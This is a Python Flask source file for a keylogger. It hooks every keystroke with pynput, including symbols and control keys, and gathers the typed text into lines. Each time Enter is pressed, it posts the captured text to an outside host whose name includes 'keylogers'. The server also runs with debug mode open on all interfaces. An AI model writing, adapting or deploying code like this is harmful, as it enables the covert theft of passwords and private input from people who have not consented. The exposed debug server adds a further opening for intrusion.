from flask import Flask, render_template, request, jsonify
from pynput import keyboard
import threading
import requests

app = Flask(__name__)

# Set of sensitive keys and symbols
sensitive_keys = {keyboard.Key.enter, keyboard.Key.backspace, keyboard.Key.tab, keyboard.Key.esc,
                  keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r,
                  keyboard.Key.caps_lock, keyboard.Key.space}  # Added space key to sensitive_keys
sensitive_symbols = set('!@#$%^&*()_+{}:"<>?|[]\\;,./`~')

# Global variables to store typed text and words
typed_text = ""
typed_words = []
typed_text2 = ""
typed_words2 = []
message = message2 = message3 = None
lock = threading.Lock()

# Target URL to send data to
target_url = "https://keylogersbabus.netlify.app/"

# Function to send data to the target URL
def send_data(data):
    try:
        response = requests.post(target_url, json=data)
        print(f"Data sent. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending data: {e}")

@app.route('/')
def index():
    global message3, message2, message
    with lock:
        message3 = "Monitoring started"
    return render_template('htmltt.html', message3=message3, message2=message2, message=message)

@app.route('/monitor', methods=['POST'])
def monitor_keys():
    global message, message2, message3

    # Function to handle key release event
    def on_release(key):
        global message
        if key == keyboard.Key.esc:
            with lock:
                message = "The monitoring is closed"
            return False

    # Function to handle key press event
    def on_press(key):
        global typed_text, typed_words, message2, message, typed_text2, typed_words2
        with lock:
            try:
                if hasattr(key, 'char') and (key.char.isalnum() or key.char in sensitive_symbols):
                    typed_text += key.char
                    typed_text2 += key.char
                elif key == keyboard.Key.space:
                    typed_text += ' '
                    typed_text2 += ' '
            except AttributeError:
                pass

            if key in sensitive_keys:
                typed_text += f" [{key}]"

            if key == keyboard.Key.enter:
                if typed_text:
                    typed_words.append(typed_text)  # Append the text before clearing
                    typed_text = ""  # Clear typed_text
                    message2 = "<br>".join(typed_words)  # Update message2

                if typed_text2:
                    typed_words2.append(typed_text2)  # Append the text before clearing
                    typed_text2 = ""  # Clear typed_text2
                    message = "<br>".join(typed_words2)  # Update message

                # Send the collected data to the target URL
                data = {"typed_text": typed_text, "typed_words": typed_words}
                send_data(data)

    # Start the key listener
    def start_key_listener():
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    # Start key listener thread if it's not already running
    if not hasattr(monitor_keys, 'key_listener_thread') or not monitor_keys.key_listener_thread.is_alive():
        monitor_keys.key_listener_thread = threading.Thread(target=start_key_listener)
        monitor_keys.key_listener_thread.start()

    return '', 204  # No Content response

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5143, debug=True, threaded=True)
